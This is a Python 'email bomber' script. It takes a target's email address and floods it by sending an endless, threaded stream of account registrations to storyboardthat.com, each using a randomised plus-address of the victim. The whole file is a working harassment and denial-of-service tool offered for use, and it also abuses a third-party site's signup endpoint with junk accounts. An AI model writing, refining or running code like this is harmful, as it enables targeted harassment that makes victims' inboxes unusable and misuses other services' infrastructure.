
# made by vanish#1000
# only download this from https://github.com/cumsack/kunai

import requests
import os; os.system("title vanish's email bomber&&cls")
import random
import threading
import time
from datetime import datetime

global sent
sent = 0

target = input("\033[0m[\033[35m" + datetime.now().strftime("%H:%M:%S") + f"\033[0m] Target: \033[35m")
username = target.split("@")[0]
domain = target.split("@")[1]

def bomb(username, domain):
    global sent
    user = "kunai" + str(random.randint(1, 99999999))
    password = "kunai" + str(random.randint(1, 9999))
    email = username + "+" + str(random.randint(1, 99999999)) + f"@{domain}"
    r=requests.post(
        f"https://www.storyboardthat.com/account/handleregister",
        headers={
            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
        },
        json={
            "returnUrl": "",
            "isPopup": False,
            "Layout": "~/Views/Shared/Layouts/_BootStrapMainSite.cshtml",
            "UIVersion": 2,
            "RegisterSbtEmails": True,
            "AcceptsTerms": True,
            "RegisterUserName": user,
            "RegisterEmail": email,
            "RegisterPassword": password
        }
    )
    print("\033[0m[\033[35m" + datetime.now().strftime("%H:%M:%S") + f"\033[0m] Sent signup to \033[35mwww.storyboardthat.com\033[0m | \033[35m{user}\033[0m:\033[35m{password}\033[0m:\033[35m{email} \033[0m| \033[35m{r.status_code}")
    sent +=1 
    os.system("title " + str(sent))


while True:
    threading.Thread(target=bomb,args=(username, domain)).start()
    time.sleep(0.001) # delay needed bc ive had cases where threading can crash because theres no delay | feel free to remove this